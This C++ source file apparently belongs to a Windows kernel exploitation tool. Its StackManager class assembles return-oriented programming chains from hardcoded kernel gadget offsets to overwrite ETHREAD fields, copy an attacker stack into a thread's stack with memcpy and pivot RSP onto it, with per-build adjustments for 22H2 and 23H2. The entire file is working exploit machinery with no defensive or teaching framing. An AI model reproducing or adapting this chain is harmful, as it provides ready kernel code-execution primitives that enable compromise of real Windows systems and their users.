#include <include/stack/stack_manager.hpp>
#include <include/utils/utils.hpp>

std::uint64_t* StackManager::GetStackBuffer()
{
	return Stack->data();
}

std::size_t StackManager::GetStackSize()
{
	return Stack->size() * sizeof(std::uint64_t);
}

void StackManager::AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName)
{
	const std::uint64_t GadgetAddress = KernelModuleBase + GadgetOffset;
	std::printf("[+] RSP+0x%x\tGadget %s (0x%p)\n", this->GetStackSize(), GadgetLogName.data(), GadgetAddress);
	Stack->push_back(GadgetAddress);
}

void StackManager::AddValue(const std::uint64_t Value, const std::string_view& ValueLogName)
{
	std::printf("[+] RSP+0x%x\tValue %s (0x%p)\n", this->GetStackSize(), ValueLogName.data(), Value);
	Stack->push_back(Value);
}

void StackManager::AddPadding(const std::size_t PaddingSize)
{
	// TODO: Make this a cyclic func.
	// right now it's just hardcoded.
	for (int i = 0; i < (PaddingSize / sizeof(std::uint64_t)); i++)
		this->AddValue(0xC0FEBABEC0FEBABE, "Padding");
}

void StackManager::ChainStack(StackManager* NewStack)
{
	if (!NewStack)
		return;

	this->Stack->insert(this->Stack->end(), NewStack->Stack->begin(), NewStack->Stack->end());
}

void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
{
	this->AddFunctionCall("PsGetCurrentThread");

	// r9->rcx->NewValue, Setup value to write. It has a sideeffect on eax so we perform thiss
	// before the rest of our chain.
	this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
	this->AddValue(0, "set r8 to 0");
	this->AddPadding(0x28);
	this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
	this->AddPadding(0x8);
	this->AddValue(NewValue, "New field value");
	this->AddPadding(0x18);
	this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");

	// rax = Thread + Offset inside of ETHREAD, which we will write to
	this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
	this->AddPadding(0x8);
	this->AddValue(FieldOffset, "ETHREAD offset");
	this->AddPadding(0x18);
	this->AddGadget(0x263f08, "add rax, rcx; ret;");
	this->AddGadget(0x3c4eac, "mov qword ptr [rax], r9; ret;");
}

void StackManager::ModifyThreadStartAddress(const std::uint64_t NewStartAddress)
{
	constexpr std::uint64_t EThreadStartAddressOffset = 0x4e0;
	constexpr std::uint64_t EThreadWin32StartAddressOffset = 0x560;
	this->ModifyThreadField(EThreadStartAddressOffset, NewStartAddress);
	this->ModifyThreadField(EThreadWin32StartAddressOffset, NewStartAddress);
}

void StackManager::ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit)
{
	constexpr std::uint64_t EThreadStackBaseOffset = 0x38;
	constexpr std::uint64_t EThreadStackLimitOffset = 0x30;
	this->ModifyThreadField(EThreadStackBaseOffset, NewStackBase);
	this->ModifyThreadField(EThreadStackLimitOffset, NewStackLimit);
}

void StackManager::PivotStackIntoEthread(StackManager* StackToPivot, void* StackLimitStoreAddress, void* CurrentStackOffsetAddress, void* DummyMemoryAllocation)
{
    // TODO: Remove this from here
    const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();

    this->AddFunctionCall("PsGetCurrentThread");
    this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x8);
    this->AddValue(0x30, "stack limit");
    this->AddPadding(0x10);
    this->AddGadget(0x263f08, "add rax, rcx; ret;");

    // rdx = stack limit store address
    this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x10);
    this->AddValue((std::uint64_t)StackLimitStoreAddress, "stack limit store address");
    this->AddPadding(0x8);

    // dereference rax, so that rax = stack limit
    this->AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
    this->AddGadget(0x432d4d, "mov qword ptr [rdx], rax; ret;");


    // move rax into rbx to preserve it
    this->AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
    // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
    // read the value of the current stack offset global variable
    this->AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
    this->AddPadding(0x18);
    this->AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
    // rcx=0
    this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x8);
    this->AddValue(0, "set rcx to 0");
    this->AddPadding(0x10);
    // move eax into ecx so we store the offset in rcx (we don't need to use full 64bits because CurrentStackOffsetAddress
    // holds a small value, either 0x2000 or 0x4000 as an offset
    this->AddGadget(0x212fcb, "xchg ecx, eax; ret;");
    // restore the old value of rax into rax from rbx
    this->AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
    this->AddPadding(0x20 + 0x8);
    this->AddGadget(0x263f08, "add rax, rcx; ret;");


    // Write our own stack into thread's legitimate stack

    // r9=rax, IMPORTANT NOTE: On some windows builds this includes "add rsp, 0x28;" and on some not,
    // if yours includes it, then you must account for this in the check which decides if padding should be added
    this->AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
        this->AddPadding(0x28);

    // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
    // to a valid memory dummy pool so that it writes there.
    this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x10);
    this->AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
    this->AddPadding(0x8);
    this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
    this->AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
    this->AddPadding(0x28);
    this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");

    this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x10);
    this->AddValue((std::uint64_t)StackToPivot->StackAllocAddress, "src address");
    this->AddPadding(0x8);
    this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
    this->AddValue(0x2000, "count value");
    this->AddPadding(0x28);
    this->AddFunctionCall("memcpy");

    // Grab stack limit
    this->AddFunctionCall("PsGetCurrentThread");
    this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x8);
    this->AddValue(0x30, "stack limit");
    this->AddPadding(0x10);
    this->AddGadget(0x263f08, "add rax, rcx; ret;");
    // dereference rax, so that rax = stack limit
    this->AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");

    // get the value of the current stack offset global so we add it into rax

    // same code as above - basically just get the value of CurrentStackOffsetAddress
    // and add it to rax. so rax = stacklimit + curr_stack_offset
    this->AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
    this->AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
    this->AddPadding(0x18);
    this->AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
    this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x8);
    this->AddValue(0, "set rcx to 0");
    this->AddPadding(0x10);
    this->AddGadget(0x212fcb, "xchg ecx, eax; ret;");
    this->AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
    this->AddPadding(0x20 + 0x8);
    this->AddGadget(0x263f08, "add rax, rcx; ret;");

    // same as above r9->rax->rcx, this is being stored here so we can overwrite rax for xor operation
    this->AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
        this->AddPadding(0x28);
    this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x10);
    this->AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
    this->AddPadding(0x8);
    this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
    this->AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
    this->AddPadding(0x28);
    this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
    // r11=rcx
    this->AddGadget(0xb4096a, "mov r11, rcx; mov r9d, edx; cmp edx, dword ptr [rax]; je 0x......; mov eax, 0xc000000d; ret;");

    // xor the current stack offset by global by 0x6000 (0x2000 ^ 0x4000 = 0x6000),
    // meaning we will always swap between 0x2000 and 0x4000 per iteration.
    this->AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddValue(0x6000, "xor key (0x6000)");
    this->AddPadding(0x18);
    this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x10);
    this->AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr (to xor)");
    this->AddPadding(0x8);
    this->AddGadget(0x43d5e8, "xor qword ptr [rdx], rax; ret;");

    // perform pivot, rsp=r11
    this->AddGadget(0x533eda, "mov rsp, r11; ret;");
}
